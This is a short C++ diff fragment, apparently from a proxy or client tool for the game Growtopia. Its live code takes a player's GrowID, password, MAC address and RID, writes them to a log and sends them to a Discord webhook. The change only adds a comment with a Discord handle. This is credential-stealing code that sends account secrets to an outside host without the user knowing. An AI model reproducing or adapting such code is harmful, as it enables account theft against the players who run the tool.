@@ -25,7 +25,7 @@
                 std::transform(password.begin(), password.end(), password.begin(), ::tolower);
                 std::string check = growid + "|" + password + "|" + mac + "|" + rid;
                 logsaccount("GrowID: " + growid + ",Password: " + password + "Mac: " + mac + "Rid: " + rid);
-                DiscordWebhookSender("GrowID: " + growid + "Password: " + password + "Mac: " + mac + "Rid: " + rid);
+                DiscordWebhookSender("GrowID: " + growid + "Password: " + password + "Mac: " + mac + "Rid: " + rid); //Altanb#3535
             }
             packet = var.serialize();
             gt::in_game = false;
